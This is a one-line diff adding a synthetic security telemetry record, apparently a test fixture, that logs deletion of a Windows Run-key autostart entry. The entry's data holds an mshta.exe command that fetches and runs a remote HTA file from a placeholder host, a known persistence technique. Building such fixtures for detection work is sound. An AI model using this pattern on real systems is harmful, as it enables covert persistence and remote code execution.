@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"ActionType":"RegistryValueDeleted","RegistryKey":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","RegistryValueName":"SyntheticUpdate","RegistryValueData":"mshta.exe https://example.invalid/synthetic.hta"}}
